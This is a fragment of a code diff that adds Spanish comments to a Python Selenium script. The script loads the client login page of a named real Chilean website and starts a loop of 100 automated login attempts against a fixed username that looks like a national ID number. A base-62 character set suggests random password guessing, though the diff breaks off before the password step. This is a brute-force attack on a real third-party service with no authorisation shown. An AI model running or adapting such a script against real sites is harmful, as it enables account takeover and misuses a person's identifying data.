@@ -19,13 +19,23 @@ import random
 
 #Carga el módulo webdriver para implementar las clases y métodos para el soporte de los diferentes navegadores
 from selenium import webdriver
+
+#Carga la configuración del teclado virtual para simular las entradas de teclado
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.action_chains import ActionChains
+
+#Crea una instancia de Chrome que se pueda controlar con comandos de selenium.
 driver = webdriver.Chrome()
+
+#Llama a la página chilena, que será la base para las interacciones automatizadas
 driver.get('https://www.wei.cl/cliente/ingreso')
 time.sleep(5)
+#variable que contendrá carácteres uppercase, lowercase y digitos del 0-9, es decir base 62
 letters = string.ascii_letters + string.digits
+
+#Inicia la automatiación de 100 accesos (verifica si el sitio web es susceptible a ataques por fuerza bruta) 
 for x in range(100):
+
+    #Se buscará dentro del sitio web los elementos que contengan un atributo name llamados ''access login''
     usr = driver.find_element_by_id("client-username")
     usr.clear()
     usr.send_keys("20189579-0")
